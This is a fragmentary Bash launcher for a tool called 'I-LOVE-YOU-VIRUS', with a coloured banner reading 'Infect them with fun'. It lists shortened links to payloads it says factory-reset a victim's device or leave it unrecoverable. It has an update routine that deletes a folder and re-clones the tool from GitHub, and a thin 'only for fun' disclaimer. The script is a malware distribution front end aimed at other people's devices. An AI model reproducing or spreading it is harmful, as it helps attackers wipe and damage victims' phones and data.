...
'
echo " " 
echo -e "$red                       ▶Coded by$grn J-SCRIPTING$red◀$rset"
echo -e "$red                      ⫸$ylo  jJ-SCRIPTINGs$red ⫷$rset"
echo 
# Functions
echo -e "$red                    [Infect them with fun]$rset"
echo " "
...
device it will be factory reset and lot more happens.
                                👇👇👇
         \e[92mL1NK :- \e[96mhttps://iloveyou/3ild93L\e[91m
                                 👆👆👆
...
device will not be recovered.(Antivirus)
                    👇👇👇
        \e[92mL1NK :- \e[96mhttps://iloveyou/3fX8ljZ\e[93m
                    👆👆👆
Use only for fun purpose not for harming someone 😇✌️. 
...
upd(){
if [ -d "$HOME/I-LOVE-YOU-VIRUS" ];
then
cd $HOME
rm -rf I-LOVE-YOU-VIRUS
elif [ -d "$HOME/I-LOVE-YOU-VIRUS" ];
then
cd $HOME
rm -rf I-LOVE-YOU-VIRUS
else
...
while git clone https://github.com/j-scripting/I-LOVE-YOU-VIRUS 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
...
vid(){
FILE=$HOME/I-LOVE-YOU-VIRUS/j-scripting
if [ -f "$FILE" ]; then
pop
else
echo
